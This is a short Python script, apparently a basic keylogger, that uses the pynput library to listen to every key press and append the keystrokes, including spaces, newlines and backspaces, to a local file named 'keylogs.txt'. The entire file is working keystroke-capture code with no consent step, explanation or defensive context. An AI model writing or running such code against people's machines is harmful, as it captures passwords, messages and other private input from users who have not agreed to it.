from pynput import keyboard

log_file = "keylogs.txt"  # File to store keystrokes

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # Replace space key with a space
            elif key == keyboard.Key.enter:
                f.write("\n")  # New line for Enter key
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")  # Log backspace
            else:
                f.write(str(key).replace("'", ""))  # Remove quotes from characters
    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()